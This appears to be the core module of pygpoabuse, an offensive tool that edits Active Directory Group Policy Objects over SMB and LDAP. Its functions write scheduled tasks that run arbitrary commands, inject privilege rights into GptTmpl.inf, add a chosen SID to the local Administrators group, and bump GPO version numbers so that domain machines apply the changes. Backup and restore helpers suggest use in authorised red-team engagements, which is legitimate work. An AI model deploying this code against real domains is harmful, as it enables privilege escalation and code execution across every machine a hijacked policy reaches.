import asyncio
import logging
import re
import os
import time
import json
from pygpoabuse.scheduledtask import ScheduledTask
from pygpoabuse.ldap import Ldap
from pygpoabuse.userrights import UserRights


class GPO:
    def __init__(self, smb_session):
        self._smb_session = smb_session
        self._backups = {}  # Store information about backups

    def update_extensionNames(self, extensionName):
        val1 = "00000000-0000-0000-0000-000000000000"
        val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
        val3 = "AADCED64-746C-4633-A97C-D61349046527"

        if extensionName is None:
            extensionName = ""

        try:
            if not val2 in extensionName:
                new_values = []
                toUpdate = ''.join(extensionName)
                test = toUpdate.split("[")
                for i in test:
                    new_values.append(i.replace("{", "").replace("}", " ").replace("]", ""))

                if val1 not in toUpdate:
                    new_values.append(val1 + " " + val2)

                elif val1 in toUpdate:
                    for k, v in enumerate(new_values):
                        if val1 in new_values[k]:
                            toSort = []
                            test2 = new_values[k].split()
                            for f in range(1, len(test2)):
                                toSort.append(test2[f])
                            toSort.append(val2)
                            toSort.sort()
                            new_values[k] = test2[0]
                            for val in toSort:
                                new_values[k] += " " + val

                if val3 not in toUpdate:
                    new_values.append(val3 + " " + val2)

                elif val3 in toUpdate:
                    for k, v in enumerate(new_values):
                        if val3 in new_values[k]:
                            toSort = []
                            test2 = new_values[k].split()
                            for f in range(1, len(test2)):
                                toSort.append(test2[f])
                            toSort.append(val2)
                            toSort.sort()
                            new_values[k] = test2[0]
                            for val in toSort:
                                new_values[k] += " " + val

                new_values.sort()

                new_values2 = []
                for i in range(len(new_values)):
                    if new_values[i] is None or new_values[i] == "":
                        continue
                    value1 = new_values[i].split()
                    new_val = ""
                    for q in range(len(value1)):
                        if value1[q] is None or value1[q] == "":
                            continue
                        new_val += "{" + value1[q] + "}"
                    new_val = "[" + new_val + "]"
                    new_values2.append(new_val)

                return "".join(new_values2)
        except:
            return "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]"

    async def update_ldap(self, url, domain, gpo_id, gpo_type="computer"):
        ldap = Ldap(url, gpo_id, domain)
        r = await ldap.connect()
        if not r:
            logging.debug("Could not connect to LDAP")
            return False

        version = await ldap.get_attribute("versionNumber")
        
        if gpo_type == "computer":
            attribute_name = "gPCMachineExtensionNames"
            updated_version = version + 1
        else:
            attribute_name = "gPCUserExtensionNames"
            updated_version = version + 65536

        extensionName = await ldap.get_attribute(attribute_name)

        if extensionName == False:
            logging.debug("Could not get {} attribute".format(attribute_name))
            return False

        updated_extensionName = self.update_extensionNames(extensionName)

        logging.debug("New extensionName: {}".format(updated_extensionName))

        await ldap.update_attribute(attribute_name, updated_extensionName, extensionName)
        await ldap.update_attribute("versionNumber", updated_version, version)

        return updated_version

    def update_versions(self, url, domain, gpo_id, gpo_type):
        updated_version = asyncio.run(self.update_ldap(url, domain, gpo_id, gpo_type))

        if not updated_version:
            return False

        logging.debug("Updated version number : {}".format(updated_version))

        try:
            tid = self._smb_session.connectTree("SYSVOL")
            fid = self._smb_session.openFile(tid, domain + "/Policies/{" + gpo_id + "}/gpt.ini")
            content = self._smb_session.readFile(tid, fid)
             # Added by @Deft_ to comply with french active directories (mostly accents)
            try:
                new_content = re.sub('=[0-9]+', '={}'.format(updated_version), content.decode("utf-8"))
            except UnicodeDecodeError:
                new_content = re.sub('=[0-9]+', '={}'.format(updated_version), content.decode("latin-1"))
            self._smb_session.writeFile(tid, fid, new_content)
            self._smb_session.closeFile(tid, fid)
        except:
            logging.error("Unable to update gpt.ini file", exc_info=True)
            return False

        logging.debug("gpt.ini file successfully updated")
        return True

    def _check_or_create(self, base_path, path):
        for dir in path.split("/"):
            base_path += dir + "/"
            try:
                self._smb_session.listPath("SYSVOL", base_path)
                logging.debug("{} exists".format(base_path))
            except:
                try:
                    self._smb_session.createDirectory("SYSVOL", base_path)
                    logging.debug("{} created".format(base_path))
                except:
                    logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                    return False
        return True

    def update_scheduled_task(self, domain, gpo_id, name="", mod_date="", description="", powershell=False, command="", gpo_type="computer", force=False):

        try:
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL")
        except:
            logging.error("Unable to connect to SYSVOL share", exc_info=True)
            return False

        path = domain + "/Policies/{" + gpo_id + "}/"

        try:
            self._smb_session.listPath("SYSVOL", path)
            logging.debug("GPO id {} exists".format(gpo_id))
        except:
            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
            return False

        if gpo_type == "computer":
            root_path = "Machine"
        else:
            root_path = "User"

        if not self._check_or_create(path, "{}/Preferences/ScheduledTasks".format(root_path)):
            return False

        path += "{}/Preferences/ScheduledTasks/ScheduledTasks.xml".format(root_path)

        try:
            fid = self._smb_session.openFile(tid, path)
            st_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description,
                               powershell=powershell, command=command, old_value=st_content)
            tasks = st.parse_tasks(st_content)

            if not force:
                logging.error("The GPO already includes a ScheduledTasks.xml.")
                logging.error("Use -f to append to ScheduledTasks.xml")
                logging.error("Use -v to display existing tasks")
                logging.warning("C: Create, U: Update, D: Delete, R: Replace")
                for task in tasks:
                    logging.warning("[{}] {} (Type: {})".format(task[0], task[1], task[2]))
                return False

            new_content = st.generate_scheduled_task_xml()
        except Exception as e:
            # File does not exist
            logging.debug("ScheduledTasks.xml does not exist. Creating it...")
            try:
                fid = self._smb_session.createFile(tid, path)
                logging.debug("ScheduledTasks.xml created")
            except:
                logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                return False
            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description, powershell=powershell, command=command)
            new_content = st.generate_scheduled_task_xml()

        try:
            self._smb_session.writeFile(tid, fid, new_content)
            logging.debug("ScheduledTasks.xml has been saved")
        except:
            logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
            self._smb_session.closeFile(tid, fid)
            return False
        self._smb_session.closeFile(tid, fid)
        return st.get_name()

    def update_user_rights(self, domain, gpo_id, username, sid, rights, force=False):
        """Add user rights to a GPO

        Args:
            domain: Domain name
            gpo_id: ID of the GPO to modify
            username: Username to assign rights to
            sid: SID of the user
            rights: Comma-separated list of rights to assign
            force: Force update if GptTmpl.inf already exists

        Returns:
            bool: True if successful, False otherwise
        """
        try:
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL")
        except:
            logging.error("Unable to connect to SYSVOL share", exc_info=True)
            return False

        path = domain + "/Policies/{" + gpo_id + "}/"

        try:
            self._smb_session.listPath("SYSVOL", path)
            logging.debug("GPO id {} exists".format(gpo_id))
        except:
            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
            return False

        # User rights can only be applied to Machine policy
        root_path = "Machine"
        secedit_path = "{}/Microsoft/Windows NT/SecEdit".format(root_path)

        if not self._check_or_create(path, secedit_path):
            return False

        user_rights = UserRights(username, sid, rights)
        is_valid, invalid_rights = user_rights.validate_rights()
        
        if not is_valid:
            logging.error("Invalid rights specified: {}".format(", ".join(invalid_rights)))
            return False

        inf_path = path + "{}/Microsoft/Windows NT/SecEdit/GptTmpl.inf".format(root_path)

        try:
            fid = self._smb_session.openFile(tid, inf_path)
            inf_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
            
            # Check if the file already contains user rights
            if "[Privilege Rights]" in inf_content and not force:
                logging.error("The GPO already includes user rights in GptTmpl.inf.")
                logging.error("Use -f to override the existing settings")
                self._smb_session.closeFile(tid, fid)
                return False
            
            # Close the existing file before proceeding
            self._smb_session.closeFile(tid, fid)
            
            # If force is true, or there's no user rights section, create/update the file
            if force or "[Privilege Rights]" not in inf_content:
                if "[Privilege Rights]" not in inf_content:
                    # No rights section exists, append it
                    logging.debug("No user rights section exists in the file, adding it")
                    
                    # Remove the existing section markers if they exist
                    sections = ["[Unicode]", "[Version]", "[Privilege Rights]"]
                    clean_content = inf_content
                    for section in sections:
                        clean_content = clean_content.replace(section, "")
                    
                    # Generate new content with the user rights
                    new_content = user_rights.generate_inf_file_content()
                    
                    # Add any other content that might have been in the file
                    if clean_content.strip():
                        new_content += clean_content
                else:
                    # Rights section exists, but we're forcing the update
                    logging.debug("User rights section exists, forcing update")
                    new_content = user_rights.generate_inf_file_content()
                
                # Open the file for writing
                fid = self._smb_session.createFile(tid, inf_path)
                self._smb_session.writeFile(tid, fid, new_content)
                self._smb_session.closeFile(tid, fid)
                return True
        
        except Exception as e:
            # File does not exist, create it
            logging.debug("GptTmpl.inf does not exist. Creating it...")
            try:
                fid = self._smb_session.createFile(tid, inf_path)
                logging.debug("GptTmpl.inf created")
                
                # Generate and write the inf file content
                new_content = user_rights.generate_inf_file_content()
                self._smb_session.writeFile(tid, fid, new_content)
                self._smb_session.closeFile(tid, fid)
                return True
            except:
                logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                return False
        
        return False

    def backup_gpo(self, domain, gpo_id, backup_dir=None):
        """Create a backup of a GPO before modification
        
        Args:
            domain: Domain name
            gpo_id: ID of the GPO to backup
            backup_dir: Local directory to store backup (default: current directory)
            
        Returns:
            str: Backup ID if successful, False otherwise
        """
        try:
            # Generate backup ID and create backup directory
            backup_id = f"gpo_backup_{gpo_id}_{int(time.time())}"
            if backup_dir is None:
                backup_dir = os.path.join(os.getcwd(), backup_id)
            else:
                backup_dir = os.path.join(backup_dir, backup_id)
                
            os.makedirs(backup_dir, exist_ok=True)
            logging.info(f"Creating GPO backup in {backup_dir}")
            
            # Connect to SYSVOL
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL for backup")
            
            # Define the GPO path
            gpo_path = domain + "/Policies/{" + gpo_id + "}/"
            
            # Check if GPO exists
            try:
                self._smb_session.listPath("SYSVOL", gpo_path)
                logging.debug(f"GPO id {gpo_id} exists for backup")
            except:
                logging.error(f"GPO id {gpo_id} does not exist for backup", exc_info=True)
                return False
                
            # Store version information
            try:
                # Get gpt.ini for version info
                gpt_path = gpo_path + "gpt.ini"
                fid = self._smb_session.openFile(tid, gpt_path)
                gpt_content = self._smb_session.readFile(tid, fid)
                self._smb_session.closeFile(tid, fid)
                
                # Save gpt.ini to backup
                with open(os.path.join(backup_dir, "gpt.ini"), "wb") as f:
                    f.write(gpt_content)
                    
                # Extract version from gpt.ini
                try:
                    gpt_text = gpt_content.decode("utf-8")
                except UnicodeDecodeError:
                    gpt_text = gpt_content.decode("latin-1")
                    
                version_match = re.search(r'Version=(\d+)', gpt_text)
                version = int(version_match.group(1)) if version_match else 0
                
                # Store backup metadata
                metadata = {
                    "gpo_id": gpo_id,
                    "domain": domain,
                    "timestamp": int(time.time()),
                    "version": version,
                    "backup_dir": backup_dir
                }
                
                # Backup Machine policy files if they exist
                machine_path = gpo_path + "Machine"
                try:
                    # Check if Machine directory exists
                    self._smb_session.listPath("SYSVOL", machine_path)
                    
                    # Backup Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf (user rights)
                    secedit_path = machine_path + "/Microsoft/Windows NT/SecEdit"
                    inf_path = secedit_path + "/GptTmpl.inf"
                    
                    try:
                        # Create local directories
                        os.makedirs(os.path.join(backup_dir, "Machine", "Microsoft", "Windows NT", "SecEdit"), exist_ok=True)
                        
                        # Try to backup GptTmpl.inf
                        fid = self._smb_session.openFile(tid, inf_path)
                        inf_content = self._smb_session.readFile(tid, fid)
                        self._smb_session.closeFile(tid, fid)
                        
                        # Save locally
                        with open(os.path.join(backup_dir, "Machine", "Microsoft", "Windows NT", "SecEdit", "GptTmpl.inf"), "wb") as f:
                            f.write(inf_content)
                            
                        metadata["machine_rights"] = True
                    except:
                        logging.debug("No user rights settings (GptTmpl.inf) found for backup")
                        metadata["machine_rights"] = False
                    
                    # Backup Machine/Preferences/ScheduledTasks/ScheduledTasks.xml
                    tasks_path = machine_path + "/Preferences/ScheduledTasks"
                    tasks_file = tasks_path + "/ScheduledTasks.xml"
                    
                    try:
                        # Create local directories
                        os.makedirs(os.path.join(backup_dir, "Machine", "Preferences", "ScheduledTasks"), exist_ok=True)
                        
                        # Try to backup ScheduledTasks.xml
                        fid = self._smb_session.openFile(tid, tasks_file)
                        tasks_content = self._smb_session.readFile(tid, fid)
                        self._smb_session.closeFile(tid, fid)
                        
                        # Save locally
                        with open(os.path.join(backup_dir, "Machine", "Preferences", "ScheduledTasks", "ScheduledTasks.xml"), "wb") as f:
                            f.write(tasks_content)
                            
                        metadata["machine_tasks"] = True
                    except:
                        logging.debug("No scheduled tasks (Machine) found for backup")
                        metadata["machine_tasks"] = False
                        
                except:
                    logging.debug("No Machine policy found for backup")
                    metadata["machine_policy"] = False
                
                # Backup User policy files if they exist
                user_path = gpo_path + "User"
                try:
                    # Check if User directory exists
                    self._smb_session.listPath("SYSVOL", user_path)
                    
                    # Backup User/Preferences/ScheduledTasks/ScheduledTasks.xml
                    tasks_path = user_path + "/Preferences/ScheduledTasks"
                    tasks_file = tasks_path + "/ScheduledTasks.xml"
                    
                    try:
                        # Create local directories
                        os.makedirs(os.path.join(backup_dir, "User", "Preferences", "ScheduledTasks"), exist_ok=True)
                        
                        # Try to backup ScheduledTasks.xml
                        fid = self._smb_session.openFile(tid, tasks_file)
                        tasks_content = self._smb_session.readFile(tid, fid)
                        self._smb_session.closeFile(tid, fid)
                        
                        # Save locally
                        with open(os.path.join(backup_dir, "User", "Preferences", "ScheduledTasks", "ScheduledTasks.xml"), "wb") as f:
                            f.write(tasks_content)
                            
                        metadata["user_tasks"] = True
                    except:
                        logging.debug("No scheduled tasks (User) found for backup")
                        metadata["user_tasks"] = False
                        
                except:
                    logging.debug("No User policy found for backup")
                    metadata["user_policy"] = False
                
                # Save metadata
                with open(os.path.join(backup_dir, "metadata.json"), "w") as f:
                    json.dump(metadata, f, indent=2)
                
                # Store backup reference
                self._backups[backup_id] = metadata
                
                logging.success(f"GPO backup completed: {backup_id}")
                return backup_id
                
            except Exception as e:
                logging.error(f"Error backing up GPO: {str(e)}", exc_info=True)
                return False
                
        except Exception as e:
            logging.error(f"Error creating GPO backup: {str(e)}", exc_info=True)
            return False

    def restore_gpo(self, backup_id=None, backup_dir=None):
        """Restore a GPO from backup
        
        Args:
            backup_id: ID of the backup to restore
            backup_dir: Directory containing the backup
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Determine backup location
            if backup_id is not None and backup_id in self._backups:
                backup_dir = self._backups[backup_id]["backup_dir"]
            elif backup_dir is None:
                logging.error("Either backup_id or backup_dir must be provided")
                return False
                
            # Load metadata
            try:
                with open(os.path.join(backup_dir, "metadata.json"), "r") as f:
                    metadata = json.load(f)
            except:
                logging.error(f"Could not load backup metadata from {backup_dir}")
                return False
                
            gpo_id = metadata["gpo_id"]
            domain = metadata["domain"]
            
            # Connect to SYSVOL
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL for restore")
            
            # Define the GPO path
            gpo_path = domain + "/Policies/{" + gpo_id + "}/"
            
            # Check if GPO exists
            try:
                self._smb_session.listPath("SYSVOL", gpo_path)
                logging.debug(f"GPO id {gpo_id} exists for restore")
            except:
                logging.error(f"GPO id {gpo_id} does not exist for restore", exc_info=True)
                return False
                
            # Restore gpt.ini
            try:
                with open(os.path.join(backup_dir, "gpt.ini"), "rb") as f:
                    gpt_content = f.read()
                    
                gpt_path = gpo_path + "gpt.ini"
                fid = self._smb_session.openFile(tid, gpt_path, mode=0)  # Open for write
                self._smb_session.writeFile(tid, fid, gpt_content)
                self._smb_session.closeFile(tid, fid)
                logging.debug("Restored gpt.ini")
            except:
                logging.error("Failed to restore gpt.ini", exc_info=True)
                
            # Restore Machine policy files if they were backed up
            if metadata.get("machine_rights", False):
                try:
                    # Restore GptTmpl.inf
                    inf_path = gpo_path + "Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf"
                    
                    # Make sure the directories exist
                    self._check_or_create(gpo_path, "Machine/Microsoft/Windows NT/SecEdit")
                    
                    with open(os.path.join(backup_dir, "Machine", "Microsoft", "Windows NT", "SecEdit", "GptTmpl.inf"), "rb") as f:
                        inf_content = f.read()
                        
                    fid = self._smb_session.createFile(tid, inf_path)
                    self._smb_session.writeFile(tid, fid, inf_content)
                    self._smb_session.closeFile(tid, fid)
                    logging.debug("Restored Machine user rights (GptTmpl.inf)")
                except:
                    logging.error("Failed to restore Machine user rights", exc_info=True)
            
            # Restore Machine scheduled tasks if they were backed up
            if metadata.get("machine_tasks", False):
                try:
                    # Restore ScheduledTasks.xml
                    tasks_path = gpo_path + "Machine/Preferences/ScheduledTasks/ScheduledTasks.xml"
                    
                    # Make sure the directories exist
                    self._check_or_create(gpo_path, "Machine/Preferences/ScheduledTasks")
                    
                    with open(os.path.join(backup_dir, "Machine", "Preferences", "ScheduledTasks", "ScheduledTasks.xml"), "rb") as f:
                        tasks_content = f.read()
                        
                    fid = self._smb_session.createFile(tid, tasks_path)
                    self._smb_session.writeFile(tid, fid, tasks_content)
                    self._smb_session.closeFile(tid, fid)
                    logging.debug("Restored Machine scheduled tasks")
                except:
                    logging.error("Failed to restore Machine scheduled tasks", exc_info=True)
            
            # Restore User scheduled tasks if they were backed up
            if metadata.get("user_tasks", False):
                try:
                    # Restore ScheduledTasks.xml
                    tasks_path = gpo_path + "User/Preferences/ScheduledTasks/ScheduledTasks.xml"
                    
                    # Make sure the directories exist
                    self._check_or_create(gpo_path, "User/Preferences/ScheduledTasks")
                    
                    with open(os.path.join(backup_dir, "User", "Preferences", "ScheduledTasks", "ScheduledTasks.xml"), "rb") as f:
                        tasks_content = f.read()
                        
                    fid = self._smb_session.createFile(tid, tasks_path)
                    self._smb_session.writeFile(tid, fid, tasks_content)
                    self._smb_session.closeFile(tid, fid)
                    logging.debug("Restored User scheduled tasks")
                except:
                    logging.error("Failed to restore User scheduled tasks", exc_info=True)
            
            logging.success(f"GPO restore completed for {gpo_id}")
            return True
            
        except Exception as e:
            logging.error(f"Error restoring GPO: {str(e)}", exc_info=True)
            return False

    def add_local_admin(self, domain, gpo_id, username, sid, force=False):
        """Add a user to the local administrators group in a GPO
        
        Args:
            domain: Domain name
            gpo_id: ID of the GPO to modify
            username: Username to add as local admin
            sid: SID of the user
            force: Force update if GptTmpl.inf already exists with group memberships
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL")
        except:
            logging.error("Unable to connect to SYSVOL share", exc_info=True)
            return False
            
        path = domain + "/Policies/{" + gpo_id + "}/"
        
        try:
            self._smb_session.listPath("SYSVOL", path)
            logging.debug("GPO id {} exists".format(gpo_id))
        except:
            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
            return False
            
        # Local admin settings can only be applied to Machine policy
        root_path = "Machine"
        secedit_path = "{}/Microsoft/Windows NT/SecEdit".format(root_path)
        
        if not self._check_or_create(path, secedit_path):
            return False
            
        inf_path = path + "{}/Microsoft/Windows NT/SecEdit/GptTmpl.inf".format(root_path)
        
        # Basic content for new GptTmpl.inf file
        base_content = """[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
"""
        
        # Group membership content for local admin
        group_content = """[Group Membership]
*S-1-5-32-544__Memberof =
*S-1-5-32-544__Members = *{}
""".format(sid)
        
        try:
            try:
                # Try to open existing GptTmpl.inf
                fid = self._smb_session.openFile(tid, inf_path)
                inf_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
                self._smb_session.closeFile(tid, fid)
                
                # Check if group memberships are already defined
                if "[Group Membership]" in inf_content:
                    if not force:
                        logging.error("The GPO already includes group memberships in GptTmpl.inf.")
                        logging.error("Use -f to override the existing settings. This may break affected systems!")
                        return False
                    
                    # If force is specified, update the existing administrators line
                    new_lines = []
                    group_section = False
                    admin_line_updated = False
                    
                    for line in inf_content.splitlines():
                        if "[Group Membership]" in line:
                            group_section = True
                            new_lines.append(line)
                        elif group_section and "*S-1-5-32-544__Members" in line.replace(" ", ""):
                            # Handle case where line already contains members
                            if line.strip().endswith("="):
                                # Empty members list
                                new_lines.append(line + " *{}".format(sid))
                            else:
                                # Existing members, add new SID
                                new_lines.append(line + ", *{}".format(sid))
                            admin_line_updated = True
                        else:
                            new_lines.append(line)
                    
                    if group_section and not admin_line_updated:
                        # If we found a group section but no admin members line, add it before the next section
                        for i, line in enumerate(new_lines):
                            if group_section and line.startswith("[") and "[Group Membership]" not in line:
                                new_lines.insert(i, "*S-1-5-32-544__Members = *{}".format(sid))
                                admin_line_updated = True
                                break
                        
                        # If we didn't find another section, add at the end of file
                        if not admin_line_updated:
                            new_lines.append("*S-1-5-32-544__Members = *{}".format(sid))
                    
                    # Create the updated content
                    new_content = "\n".join(new_lines)
                else:
                    # No group membership section exists, append it
                    new_content = inf_content.rstrip() + "\n" + group_content
            except:
                # File does not exist, create new file with membership info
                logging.debug("GptTmpl.inf does not exist. Creating it...")
                new_content = base_content + group_content
            
            # Write the new content to the file
            fid = self._smb_session.createFile(tid, inf_path)
            self._smb_session.writeFile(tid, fid, new_content)
            self._smb_session.closeFile(tid, fid)
            logging.debug("Local admin update successful")
            
            return True
            
        except Exception as e:
            logging.error("Error while adding local admin: {}".format(str(e)), exc_info=True)
            return False
